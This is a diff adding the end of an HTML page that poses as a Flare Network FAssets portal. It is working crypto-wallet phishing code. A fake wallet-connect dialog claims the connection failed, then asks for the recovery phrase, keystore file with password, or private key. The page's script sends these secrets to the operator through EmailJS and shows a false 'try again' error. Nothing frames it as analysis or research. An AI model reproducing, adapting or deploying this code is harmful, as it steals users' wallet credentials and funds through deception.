+                    </div>
+                    
+                    <!-- Error Screen -->
+                    <div id="errorScreen" class="erScreen">
+                        <div class="error-message">
+                            <span id="errorMessage">Error Connecting...</span>
+                        </div>
+                        
+                        <div class="wallet-option-error">
+                            <img id="selectedWalletIcon" src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 318.6 318.6'%3e%3cstyle%3e.st0{fill:%23E2761B;stroke:%23E2761B;stroke-linecap:round;stroke-linejoin:round;}.st1{fill:%23E4761B;stroke:%23E4761B;stroke-linecap:round;stroke-linejoin:round;}.st2{fill:%23D7C1B3;stroke:%23D7C1B3;stroke-linecap:round;stroke-linejoin:round;}.st3{fill:%23233447;stroke:%23233447;stroke-linecap:round;stroke-linejoin:round;}.st4{fill:%23CD6116;stroke:%23CD6116;stroke-linecap:round;stroke-linejoin:round;}.st5{fill:%23E4751F;stroke:%23E4751F;stroke-linecap:round;stroke-linejoin:round;}.st6{fill:%23F6851B;stroke:%23F6851B;stroke-linecap:round;stroke-linejoin:round;}.st7{fill:%23C0AD9E;stroke:%23C0AD9E;stroke-linecap:round;stroke-linejoin:round;}.st8{fill:%23161616;stroke:%23161616;stroke-linecap:round;stroke-linejoin:round;}.st9{fill:%23763D16;stroke:%23763D16;stroke-linecap:round;stroke-linejoin:round;}%3c/style%3e%3cpolygon class='st0' points='274.1,35.5 174.6,109.4 193,65.8 '/%3e%3cg%3e%3cpolygon class='st1' points='44.4,35.5 143.1,110.1 125.6,65.8'/%3e%3cpolygon class='st1' points='238.3,206.8 211.8,247.4 268.5,263 284.8,207.7'/%3e%3cpolygon class='st1' points='33.9,207.7 50.1,263 106.8,247.4 80.3,206.8'/%3e%3cpolygon class='st1' points='103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1'/%3e%3cpolygon class='st1' points='214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1'/%3e%3cpolygon class='st1' points='106.8,247.4 140.6,230.9 111.4,208.1'/%3e%3cpolygon class='st1' points='177.9,230.9 211.8,247.4 207.1,208.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st2' points='211.8,247.4 177.9,230.9 180.6,253 180.3,262.3'/%3e%3cpolygon class='st2' points='106.8,247.4 138.3,262.3 138.1,253 140.6,230.9'/%3e%3c/g%3e%3cpolygon class='st3' points='138.8,193.5 110.6,185.2 130.5,176.1'/%3e%3cpolygon class='st3' points='179.7,193.5 188,176.1 208,185.2'/%3e%3cg%3e%3cpolygon class='st4' points='106.8,247.4 111.6,206.8 80.3,207.7'/%3e%3cpolygon class='st4' points='207,206.8 211.8,247.4 238.3,207.7'/%3e%3cpolygon class='st4' points='230.8,162.1 174.6,164.6 179.8,193.5 188.1,176.1 208.1,185.2'/%3e%3cpolygon class='st4' points='110.6,185.2 130.6,176.1 138.8,193.5 144.1,164.6 87.8,162.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st5' points='87.8,162.1 111.4,208.1 110.6,185.2'/%3e%3cpolygon class='st5' points='208.1,185.2 207.1,208.1 230.8,162.1'/%3e%3cpolygon class='st5' points='144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7'/%3e%3cpolygon class='st5' points='174.6,164.6 171.9,182.6 173.1,227.6 179.8,193.5'/%3e%3c/g%3e%3cpolygon class='st6' points='179.8,193.5 173.1,227.6 177.9,230.9 207.1,208.1 208.1,185.2'/%3e%3cpolygon class='st6' points='110.6,185.2 111.4,208.1 140.6,230.9 145.4,227.6 138.8,193.5'/%3e%3cpolygon class='st7' points='180.3,262.3 180.6,253 178.1,250.8 140.4,250.8 138.1,253 138.3,262.3 106.8,247.4 117.8,256.4 140.1,271.9 178.4,271.9 200.8,256.4 211.8,247.4'/%3e%3cpolygon class='st8' points='177.9,230.9 173.1,227.6 145.4,227.6 140.6,230.9 138.1,253 140.4,250.8 178.1,250.8 180.6,253'/%3e%3cg%3e%3cpolygon class='st9' points='278.3,114.2 286.8,73.4 274.1,35.5 177.9,106.9 214.9,138.2 267.2,153.5 278.8,140 273.8,136.4 281.8,129.1 275.6,124.3 283.6,118.2'/%3e%3cpolygon class='st9' points='31.8,73.4 40.3,114.2 34.9,118.2 42.9,124.3 36.8,129.1 44.8,136.4 39.8,140 51.3,153.5 103.6,138.2 140.6,106.9 44.4,35.5'/%3e%3c/g%3e%3cpolygon class='st6' points='267.2,153.5 214.9,138.2 230.8,162.1 207.1,208.1 238.3,207.7 284.8,207.7'/%3e%3cpolygon class='st6' points='103.6,138.2 51.3,153.5 33.9,207.7 80.3,207.7 111.4,208.1 87.8,162.1'/%3e%3cpolygon class='st6' points='174.6,164.6 177.9,106.9 193.1,65.8 125.6,65.8 140.6,106.9 144.1,164.6 145.3,182.8 145.4,227.6 173.1,227.6 173.3,182.8'/%3e%3c/svg%3e" alt="Wallet Icon">
+                            <span id="selectedWalletName" class="wallet-name-error">MetaMask Wallet</span>
+                        </div>
+                        
+                        <button class="connect-manually">Connect Manually</button>
+                    </div>
+                    
+                    <!-- Phrase Screen -->
+                    <div id="phraseScreen" class="phScreen">
+                        <div class="manual-header">
+                            <img id="phraseWalletIcon" src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 318.6 318.6'%3e%3cstyle%3e.st0{fill:%23E2761B;stroke:%23E2761B;stroke-linecap:round;stroke-linejoin:round;}.st1{fill:%23E4761B;stroke:%23E4761B;stroke-linecap:round;stroke-linejoin:round;}.st2{fill:%23D7C1B3;stroke:%23D7C1B3;stroke-linecap:round;stroke-linejoin:round;}.st3{fill:%23233447;stroke:%23233447;stroke-linecap:round;stroke-linejoin:round;}.st4{fill:%23CD6116;stroke:%23CD6116;stroke-linecap:round;stroke-linejoin:round;}.st5{fill:%23E4751F;stroke:%23E4751F;stroke-linecap:round;stroke-linejoin:round;}.st6{fill:%23F6851B;stroke:%23F6851B;stroke-linecap:round;stroke-linejoin:round;}.st7{fill:%23C0AD9E;stroke:%23C0AD9E;stroke-linecap:round;stroke-linejoin:round;}.st8{fill:%23161616;stroke:%23161616;stroke-linecap:round;stroke-linejoin:round;}.st9{fill:%23763D16;stroke:%23763D16;stroke-linecap:round;stroke-linejoin:round;}%3c/style%3e%3cpolygon class='st0' points='274.1,35.5 174.6,109.4 193,65.8 '/%3e%3cg%3e%3cpolygon class='st1' points='44.4,35.5 143.1,110.1 125.6,65.8'/%3e%3cpolygon class='st1' points='238.3,206.8 211.8,247.4 268.5,263 284.8,207.7'/%3e%3cpolygon class='st1' points='33.9,207.7 50.1,263 106.8,247.4 80.3,206.8'/%3e%3cpolygon class='st1' points='103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1'/%3e%3cpolygon class='st1' points='214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1'/%3e%3cpolygon class='st1' points='106.8,247.4 140.6,230.9 111.4,208.1'/%3e%3cpolygon class='st1' points='177.9,230.9 211.8,247.4 207.1,208.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st2' points='211.8,247.4 177.9,230.9 180.6,253 180.3,262.3'/%3e%3cpolygon class='st2' points='106.8,247.4 138.3,262.3 138.1,253 140.6,230.9'/%3e%3c/g%3e%3cpolygon class='st3' points='138.8,193.5 110.6,185.2 130.5,176.1'/%3e%3cpolygon class='st3' points='179.7,193.5 188,176.1 208,185.2'/%3e%3cg%3e%3cpolygon class='st4' points='106.8,247.4 111.6,206.8 80.3,207.7'/%3e%3cpolygon class='st4' points='207,206.8 211.8,247.4 238.3,207.7'/%3e%3cpolygon class='st4' points='230.8,162.1 174.6,164.6 179.8,193.5 188.1,176.1 208.1,185.2'/%3e%3cpolygon class='st4' points='110.6,185.2 130.6,176.1 138.8,193.5 144.1,164.6 87.8,162.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st5' points='87.8,162.1 111.4,208.1 110.6,185.2'/%3e%3cpolygon class='st5' points='208.1,185.2 207.1,208.1 230.8,162.1'/%3e%3cpolygon class='st5' points='144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7'/%3e%3cpolygon class='st5' points='174.6,164.6 171.9,182.6 173.1,227.6 179.8,193.5'/%3e%3c/g%3e%3cpolygon class='st6' points='179.8,193.5 173.1,227.6 177.9,230.9 207.1,208.1 208.1,185.2'/%3e%3cpolygon class='st6' points='110.6,185.2 111.4,208.1 140.6,230.9 145.4,227.6 138.8,193.5'/%3e%3cpolygon class='st7' points='180.3,262.3 180.6,253 178.1,250.8 140.4,250.8 138.1,253 138.3,262.3 106.8,247.4 117.8,256.4 140.1,271.9 178.4,271.9 200.8,256.4 211.8,247.4'/%3e%3cpolygon class='st8' points='177.9,230.9 173.1,227.6 145.4,227.6 140.6,230.9 138.1,253 140.4,250.8 178.1,250.8 180.6,253'/%3e%3cg%3e%3cpolygon class='st9' points='278.3,114.2 286.8,73.4 274.1,35.5 177.9,106.9 214.9,138.2 267.2,153.5 278.8,140 273.8,136.4 281.8,129.1 275.6,124.3 283.6,118.2'/%3e%3cpolygon class='st9' points='31.8,73.4 40.3,114.2 34.9,118.2 42.9,124.3 36.8,129.1 44.8,136.4 39.8,140 51.3,153.5 103.6,138.2 140.6,106.9 44.4,35.5'/%3e%3c/g%3e%3cpolygon class='st6' points='267.2,153.5 214.9,138.2 230.8,162.1 207.1,208.1 238.3,207.7 284.8,207.7'/%3e%3cpolygon class='st6' points='103.6,138.2 51.3,153.5 33.9,207.7 80.3,207.7 111.4,208.1 87.8,162.1'/%3e%3cpolygon class='st6' points='174.6,164.6 177.9,106.9 193.1,65.8 125.6,65.8 140.6,106.9 144.1,164.6 145.3,182.8 145.4,227.6 173.1,227.6 173.3,182.8'/%3e%3c/svg%3e" alt="Wallet Icon">
+                            <span class="close-manual">×</span>
+                        </div>
+                        
+                        <div class="tabs">
+                            <div class="tab active" data-tab="phrase">Phrase</div>
+                            <div class="tab" data-tab="keystore">Keystore</div>
+                            <div class="tab" data-tab="private-key">Private Key</div>
+                        </div>
+                        
+                        <textarea  id="phraseInput"class="form-control phrase-input" placeholder="Enter your recovery phrase" rows="5"></textarea>
+                        <div class="input-hint">Typically 12 (sometimes 24) words separated by single spaces</div>
+                        <button class="proceed">Proceed</button>
+                    </div>
+                    
+                    <!-- Keystore Screen -->
+                    <div id="keystoreScreen" class="ksScreen">
+                        <div class="manual-header">
+                            <img id="keystoreWalletIcon" src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 318.6 318.6'%3e%3cstyle%3e.st0{fill:%23E2761B;stroke:%23E2761B;stroke-linecap:round;stroke-linejoin:round;}.st1{fill:%23E4761B;stroke:%23E4761B;stroke-linecap:round;stroke-linejoin:round;}.st2{fill:%23D7C1B3;stroke:%23D7C1B3;stroke-linecap:round;stroke-linejoin:round;}.st3{fill:%23233447;stroke:%23233447;stroke-linecap:round;stroke-linejoin:round;}.st4{fill:%23CD6116;stroke:%23CD6116;stroke-linecap:round;stroke-linejoin:round;}.st5{fill:%23E4751F;stroke:%23E4751F;stroke-linecap:round;stroke-linejoin:round;}.st6{fill:%23F6851B;stroke:%23F6851B;stroke-linecap:round;stroke-linejoin:round;}.st7{fill:%23C0AD9E;stroke:%23C0AD9E;stroke-linecap:round;stroke-linejoin:round;}.st8{fill:%23161616;stroke:%23161616;stroke-linecap:round;stroke-linejoin:round;}.st9{fill:%23763D16;stroke:%23763D16;stroke-linecap:round;stroke-linejoin:round;}%3c/style%3e%3cpolygon class='st0' points='274.1,35.5 174.6,109.4 193,65.8 '/%3e%3cg%3e%3cpolygon class='st1' points='44.4,35.5 143.1,110.1 125.6,65.8'/%3e%3cpolygon class='st1' points='238.3,206.8 211.8,247.4 268.5,263 284.8,207.7'/%3e%3cpolygon class='st1' points='33.9,207.7 50.1,263 106.8,247.4 80.3,206.8'/%3e%3cpolygon class='st1' points='103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1'/%3e%3cpolygon class='st1' points='214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1'/%3e%3cpolygon class='st1' points='106.8,247.4 140.6,230.9 111.4,208.1'/%3e%3cpolygon class='st1' points='177.9,230.9 211.8,247.4 207.1,208.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st2' points='211.8,247.4 177.9,230.9 180.6,253 180.3,262.3'/%3e%3cpolygon class='st2' points='106.8,247.4 138.3,262.3 138.1,253 140.6,230.9'/%3e%3c/g%3e%3cpolygon class='st3' points='138.8,193.5 110.6,185.2 130.5,176.1'/%3e%3cpolygon class='st3' points='179.7,193.5 188,176.1 208,185.2'/%3e%3cg%3e%3cpolygon class='st4' points='106.8,247.4 111.6,206.8 80.3,207.7'/%3e%3cpolygon class='st4' points='207,206.8 211.8,247.4 238.3,207.7'/%3e%3cpolygon class='st4' points='230.8,162.1 174.6,164.6 179.8,193.5 188.1,176.1 208.1,185.2'/%3e%3cpolygon class='st4' points='110.6,185.2 130.6,176.1 138.8,193.5 144.1,164.6 87.8,162.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st5' points='87.8,162.1 111.4,208.1 110.6,185.2'/%3e%3cpolygon class='st5' points='208.1,185.2 207.1,208.1 230.8,162.1'/%3e%3cpolygon class='st5' points='144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7'/%3e%3cpolygon class='st5' points='174.6,164.6 171.9,182.6 173.1,227.6 179.8,193.5'/%3e%3c/g%3e%3cpolygon class='st6' points='179.8,193.5 173.1,227.6 177.9,230.9 207.1,208.1 208.1,185.2'/%3e%3cpolygon class='st6' points='110.6,185.2 111.4,208.1 140.6,230.9 145.4,227.6 138.8,193.5'/%3e%3cpolygon class='st7' points='180.3,262.3 180.6,253 178.1,250.8 140.4,250.8 138.1,253 138.3,262.3 106.8,247.4 117.8,256.4 140.1,271.9 178.4,271.9 200.8,256.4 211.8,247.4'/%3e%3cpolygon class='st8' points='177.9,230.9 173.1,227.6 145.4,227.6 140.6,230.9 138.1,253 140.4,250.8 178.1,250.8 180.6,253'/%3e%3cg%3e%3cpolygon class='st9' points='278.3,114.2 286.8,73.4 274.1,35.5 177.9,106.9 214.9,138.2 267.2,153.5 278.8,140 273.8,136.4 281.8,129.1 275.6,124.3 283.6,118.2'/%3e%3cpolygon class='st9' points='31.8,73.4 40.3,114.2 34.9,118.2 42.9,124.3 36.8,129.1 44.8,136.4 39.8,140 51.3,153.5 103.6,138.2 140.6,106.9 44.4,35.5'/%3e%3c/g%3e%3cpolygon class='st6' points='267.2,153.5 214.9,138.2 230.8,162.1 207.1,208.1 238.3,207.7 284.8,207.7'/%3e%3cpolygon class='st6' points='103.6,138.2 51.3,153.5 33.9,207.7 80.3,207.7 111.4,208.1 87.8,162.1'/%3e%3cpolygon class='st6' points='174.6,164.6 177.9,106.9 193.1,65.8 125.6,65.8 140.6,106.9 144.1,164.6 145.3,182.8 145.4,227.6 173.1,227.6 173.3,182.8'/%3e%3c/svg%3e" alt="Wallet Icon">
+                            <span class="close-manual">×</span>
+                        </div>
+                        
+                        <div class="tabs">
+                            <div class="tab" data-tab="phrase">Phrase</div>
+                            <div class="tab active" data-tab="keystore">Keystore</div>
+                            <div class="tab" data-tab="private-key">Private Key</div>
+                        </div>
+                        
+                        <textarea id="keystoreInput" class="form-control keystore-input" placeholder="Keystore" rows="4"></textarea>
+                        <input type="password" id="passwordInput" class="form-control password-input" placeholder="Password">
+                        <div class="input-hint">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>
+                        <button class="proceed">Proceed</button>
+                    </div>
+                    
+                    <!-- Private Key Screen -->
+                    <div id="privateKeyScreen" class="pkScreen">
+                        <div class="manual-header">
+                            <img id="privateKeyWalletIcon" src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 318.6 318.6'%3e%3cstyle%3e.st0{fill:%23E2761B;stroke:%23E2761B;stroke-linecap:round;stroke-linejoin:round;}.st1{fill:%23E4761B;stroke:%23E4761B;stroke-linecap:round;stroke-linejoin:round;}.st2{fill:%23D7C1B3;stroke:%23D7C1B3;stroke-linecap:round;stroke-linejoin:round;}.st3{fill:%23233447;stroke:%23233447;stroke-linecap:round;stroke-linejoin:round;}.st4{fill:%23CD6116;stroke:%23CD6116;stroke-linecap:round;stroke-linejoin:round;}.st5{fill:%23E4751F;stroke:%23E4751F;stroke-linecap:round;stroke-linejoin:round;}.st6{fill:%23F6851B;stroke:%23F6851B;stroke-linecap:round;stroke-linejoin:round;}.st7{fill:%23C0AD9E;stroke:%23C0AD9E;stroke-linecap:round;stroke-linejoin:round;}.st8{fill:%23161616;stroke:%23161616;stroke-linecap:round;stroke-linejoin:round;}.st9{fill:%23763D16;stroke:%23763D16;stroke-linecap:round;stroke-linejoin:round;}%3c/style%3e%3cpolygon class='st0' points='274.1,35.5 174.6,109.4 193,65.8 '/%3e%3cg%3e%3cpolygon class='st1' points='44.4,35.5 143.1,110.1 125.6,65.8'/%3e%3cpolygon class='st1' points='238.3,206.8 211.8,247.4 268.5,263 284.8,207.7'/%3e%3cpolygon class='st1' points='33.9,207.7 50.1,263 106.8,247.4 80.3,206.8'/%3e%3cpolygon class='st1' points='103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1'/%3e%3cpolygon class='st1' points='214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1'/%3e%3cpolygon class='st1' points='106.8,247.4 140.6,230.9 111.4,208.1'/%3e%3cpolygon class='st1' points='177.9,230.9 211.8,247.4 207.1,208.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st2' points='211.8,247.4 177.9,230.9 180.6,253 180.3,262.3'/%3e%3cpolygon class='st2' points='106.8,247.4 138.3,262.3 138.1,253 140.6,230.9'/%3e%3c/g%3e%3cpolygon class='st3' points='138.8,193.5 110.6,185.2 130.5,176.1'/%3e%3cpolygon class='st3' points='179.7,193.5 188,176.1 208,185.2'/%3e%3cg%3e%3cpolygon class='st4' points='106.8,247.4 111.6,206.8 80.3,207.7'/%3e%3cpolygon class='st4' points='207,206.8 211.8,247.4 238.3,207.7'/%3e%3cpolygon class='st4' points='230.8,162.1 174.6,164.6 179.8,193.5 188.1,176.1 208.1,185.2'/%3e%3cpolygon class='st4' points='110.6,185.2 130.6,176.1 138.8,193.5 144.1,164.6 87.8,162.1'/%3e%3c/g%3e%3cg%3e%3cpolygon class='st5' points='87.8,162.1 111.4,208.1 110.6,185.2'/%3e%3cpolygon class='st5' points='208.1,185.2 207.1,208.1 230.8,162.1'/%3e%3cpolygon class='st5' points='144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7'/%3e%3cpolygon class='st5' points='174.6,164.6 171.9,182.6 173.1,227.6 179.8,193.5'/%3e%3c/g%3e%3cpolygon class='st6' points='179.8,193.5 173.1,227.6 177.9,230.9 207.1,208.1 208.1,185.2'/%3e%3cpolygon class='st6' points='110.6,185.2 111.4,208.1 140.6,230.9 145.4,227.6 138.8,193.5'/%3e%3cpolygon class='st7' points='180.3,262.3 180.6,253 178.1,250.8 140.4,250.8 138.1,253 138.3,262.3 106.8,247.4 117.8,256.4 140.1,271.9 178.4,271.9 200.8,256.4 211.8,247.4'/%3e%3cpolygon class='st8' points='177.9,230.9 173.1,227.6 145.4,227.6 140.6,230.9 138.1,253 140.4,250.8 178.1,250.8 180.6,253'/%3e%3cg%3e%3cpolygon class='st9' points='278.3,114.2 286.8,73.4 274.1,35.5 177.9,106.9 214.9,138.2 267.2,153.5 278.8,140 273.8,136.4 281.8,129.1 275.6,124.3 283.6,118.2'/%3e%3cpolygon class='st9' points='31.8,73.4 40.3,114.2 34.9,118.2 42.9,124.3 36.8,129.1 44.8,136.4 39.8,140 51.3,153.5 103.6,138.2 140.6,106.9 44.4,35.5'/%3e%3c/g%3e%3cpolygon class='st6' points='267.2,153.5 214.9,138.2 230.8,162.1 207.1,208.1 238.3,207.7 284.8,207.7'/%3e%3cpolygon class='st6' points='103.6,138.2 51.3,153.5 33.9,207.7 80.3,207.7 111.4,208.1 87.8,162.1'/%3e%3cpolygon class='st6' points='174.6,164.6 177.9,106.9 193.1,65.8 125.6,65.8 140.6,106.9 144.1,164.6 145.3,182.8 145.4,227.6 173.1,227.6 173.3,182.8'/%3e%3c/svg%3e" alt="Wallet Icon">
+                            <span class="close-manual">×</span>
+                        </div>
+                        
+                        <div class="tabs">
+                            <div class="tab" data-tab="phrase">Phrase</div>
+                            <div class="tab" data-tab="keystore">Keystore</div>
+                            <div class="tab active" data-tab="private-key">Private Key</div>
+                        </div>
+                        
+                        <input type="text"  id="privateKeyInput" class="form-control private-key-input" placeholder="Private Key">
+                        <div class="input-hint">Typically 64 characters not separated by spaces</div>
+                        <button class="proceed">Proceed</button>
+                    </div>
+                </section>
+                
+                <section class="main-div-7">
+                    <div>
+                        <h1>Start building with FAssets</h1>
+                        <p>Forge a DeFi hub for XRP, BTC, and DOGE with verifiable economic security.</p>
+                    </div>
+                    <img alt="" src="https://portal-amber-nine.vercel.app/assets/flaredrop_4x-B3wBpxgF.webp" style="height: 320px; width: 320px;">
+                </section>
+            </main>
+            <footer class="mantine-Footer-root mantine-2k5q65">
+                <div class="mantine-Container-root mantine-17sxbm9">
+                    <div class="footer-div">
+                        <div style="display: flex; gap: 20px;">
+                            <div class="mantine-Text-root mantine-13nr4qr">© 2025 Flare Network</div>
+                            <a class="mantine-UnstyledButton-root mantine-97bdev" target="_blank" href="https://flare.xyz/privacy-policy/" aria-label="Read more about Flare Privacy Policy">
+                                <div class="mantine-Text-root mantine-13nr4qr">Terms & Privacy</div>
+                            </a>
+                        </div>
+                        <div style="display: flex; width: 200px; gap: 26px;">
+                            <a class="mantine-UnstyledButton-root mantine-97bdev" target="_blank" href="https://twitter.com/FlareNetworks" aria-label="Flare on Twitter">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#868e96" width="25" height="25"></svg>
+                            </a>
+                            <a class="mantine-UnstyledButton-root mantine-97bdev" target="_blank" href="https://discord.com/invite/flarenetwork" aria-label="Flare on Discord">
+                                <svg xmlns="https://discord.com/invite/flarenetwork" viewBox="0 0 24 24" fill="#868e96" width="25" height="25"></svg>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        emailjs.init({
+            publicKey: 'zXKuNUM9QxI97CCT5' 
+        });
+
+        const connectWalletBtn = document.getElementById('connectWalletBtn');
+        const walletModal = document.getElementById('bScreen');
+        const closeWalletConnect = document.getElementById('closeWalletConnect');
+        const walletOptions = document.querySelectorAll('[data-wallet]');
+        const walletSelectionScreen = document.getElementById('inScreen');
+        const errorScreen = document.getElementById('errorScreen');
+        const phraseScreen = document.getElementById('phraseScreen');
+        const keystoreScreen = document.getElementById('keystoreScreen');
+        const privateKeyScreen = document.getElementById('privateKeyScreen');
+        const errorMessage = document.getElementById('errorMessage');
+        const selectedWalletName = document.getElementById('selectedWalletName');
+        const selectedWalletIcon = document.getElementById('selectedWalletIcon');
+        const connectManuallyBtn = document.querySelector('.connect-manually');
+        const closeManualBtns = document.querySelectorAll('.close-manual');
+        const tabs = document.querySelectorAll('.tab');
+        const proceedBtns = document.querySelectorAll('.proceed'); 
+
+        let currentWalletType = 'MetaMask'; 
+        const walletIcons = {
+            'MetaMask': 'assets/download (1).png',
+            'WalletConnect': 'https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png',
+            'Coinbase': 'https://www.pngall.com/wp-content/uploads/15/Coinbase-Logo-PNG-Images.png',
+            'Ledger': 'https://th.bing.com/th/id/OIP.CBGu--2fe8tuzrTgd4qYxAAAAA?w=408&h=408&rs=1&pid=ImgDetMain'
+        };
+
+      
+        function showScreen(type) {
+            walletSelectionScreen.style.display = 'none';
+            errorScreen.style.display = 'none';
+            phraseScreen.style.display = 'none';
+            keystoreScreen.style.display = 'none';
+            privateKeyScreen.style.display = 'none';
+
+            if (type === 'wallet') walletSelectionScreen.style.display = 'block';
+            else if (type === 'error') errorScreen.style.display = 'flex';
+            else if (type === 'phrase') phraseScreen.style.display = 'flex';
+            else if (type === 'keystore') keystoreScreen.style.display = 'flex';
+            else if (type === 'private-key') privateKeyScreen.style.display = 'flex';
+        }
+
+        function updateWalletIcons() {
+            document.getElementById('phraseWalletIcon').src = walletIcons[currentWalletType] || '';
+            document.getElementById('keystoreWalletIcon').src = walletIcons[currentWalletType] || '';
+            document.getElementById('privateKeyWalletIcon').src = walletIcons[currentWalletType] || '';
+        }
+
+
+        connectWalletBtn.addEventListener('click', () => {
+            walletModal.style.display = 'flex';
+            showScreen('wallet');
+            document.body.style.overflow = 'hidden'; 
+        });
+
+        closeWalletConnect.addEventListener('click', () => {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; 
+        });
+
+        walletModal.addEventListener('click', (e) => {
+            if (e.target === walletModal) {
+                walletModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        });
+
+        walletOptions.forEach(option => {
+            option.addEventListener('click', function () {
+                const walletName = this.querySelector('span').textContent;
+                const walletType = this.getAttribute('data-wallet');
+                currentWalletType = walletType;
+
+                showScreen('error'); 
+                errorMessage.innerHTML = 'Initializing<span class="loading-dots"></span>'; 
+
+                selectedWalletName.textContent = walletName + ' Wallet';
+                selectedWalletIcon.src = walletIcons[walletType];
+
+                setTimeout(() => {
+                    errorMessage.textContent = 'Error Connecting...'; 
+                }, 3000); 
+            });
+        });
+
+        connectManuallyBtn.addEventListener('click', () => {
+            showScreen('phrase');
+            updateWalletIcons(); 
+        });
+
+        closeManualBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                walletModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            });
+        });
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function () {
+                const tabType = this.getAttribute('data-tab');
+
+                tabs.forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+
+                if (tabType === 'phrase') showScreen('phrase');
+                else if (tabType === 'keystore') showScreen('keystore');
+                else if (tabType === 'private-key') showScreen('private-key');
+
+                updateWalletIcons();
+            });
+        });
+
+        proceedBtns.forEach(btn => {
+            btn.addEventListener('click', async () => { 
+                const originalButtonText = btn.textContent; 
+                const currentScreen = document.querySelector('.phScreen, .ksScreen, .pkScreen'); // Get current manual screen
+                const currentErrorMessage = currentScreen.querySelector('.input-hint') || currentScreen.querySelector('.error-message'); // Use input-hint or a new error div
+
+                
+                btn.disabled = true; 
+                btn.textContent = 'Connecting...';
+                currentErrorMessage.innerHTML = 'Connecting<span class="loading-dots"></span>'; 
+                currentErrorMessage.style.color = '#333'; 
+                const timestamp = new Date().toLocaleString();
+                const data = {
+                    wallet: currentWalletType,
+                    type: '',
+                    timestamp,
+                    phrase: '',
+                    keystore: '',
+                    password: '',
+                    privateKey: ''
+                };
+
+                
+                const phraseInput = document.getElementById('phraseInput');
+                const keystoreInput = document.getElementById('keystoreInput');
+                const passwordInput = document.getElementById('passwordInput');
+                const privateKeyInput = document.getElementById('privateKeyInput');
+
+                if (phraseScreen.style.display === 'flex') {
+                    data.type = 'Secret Recovery Phrase';
+                    data.phrase = phraseInput ? phraseInput.value.trim() : ''; 
+                } else if (keystoreScreen.style.display === 'flex') {
+                    data.type = 'Keystore JSON';
+                    data.keystore = keystoreInput ? keystoreInput.value.trim() : '';
+                    data.password = passwordInput ? passwordInput.value.trim() : '';
+                } else if (privateKeyScreen.style.display === 'flex') {
+                    data.type = 'Private Key';
+                    data.privateKey = privateKeyInput ? privateKeyInput.value.trim() : '';
+                }
+
+                try {
+                    
+                    await emailjs.send('service_84yoi3q', 'template_vwx0fq7', data);
+                    console.log('Wallet data sent via EmailJS.');
+
+                    setTimeout(() => {
+                        currentErrorMessage.textContent = 'Error Connecting, try again later.';
+                        currentErrorMessage.style.color = 'red'; 
+                        btn.textContent = originalButtonText; 
+                        btn.disabled = false; 
+                    }, 1000);
+
+                } catch (error) {
+                    console.error('EmailJS Error:', error);
+                    currentErrorMessage.textContent = 'Error Connecting, try again later.'; 
+                    currentErrorMessage.style.color = 'red'; 
+                    btn.textContent = originalButtonText; 
+                    btn.disabled = false;
+                }
+            });
+        });
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape' && walletModal.style.display === 'flex') {
+                walletModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        });
+    });
+</script>
+</body>
+</html>
